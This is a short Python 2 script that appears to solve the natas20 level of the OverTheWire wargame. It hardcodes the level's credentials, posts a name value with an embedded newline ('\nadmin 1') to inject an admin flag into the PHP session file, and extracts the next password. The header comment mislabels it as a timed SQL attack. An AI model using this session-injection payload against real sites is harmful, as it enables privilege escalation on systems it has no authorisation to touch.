#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas20'
password='eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '?debug=true'
session = requests.session()


response = session.post(url+path, auth=(username, password), data={'name':'\nadmin 1'})

content = response.text
print content
print "=============================================================="
print session.cookies
# print re.findall("Username: natas20\nPassword: (.*)</pre>", content)[0]

# print (session.cookies['PHPSESSID']).decode('hex')

response = session.post(url+path, auth=(username, password), data={'name':'admin'})

content = response.text
print content
print "=============================================================="
print session.cookies
print "=============================================================="
print re.findall('assword: (.*)</pre>', content)[0]
#For this level all that was to be done was to understand the functions that were present in the source code. The main target was to set the 'admin' = 1. For that we exploited the explode() in myread() function.

# Two post requests were made simultaneously because with every new request a new session id was being generated on the basis of which the the filename was being set. So, with two post requests in the same session we were able to read the file that was written down in the same request earlier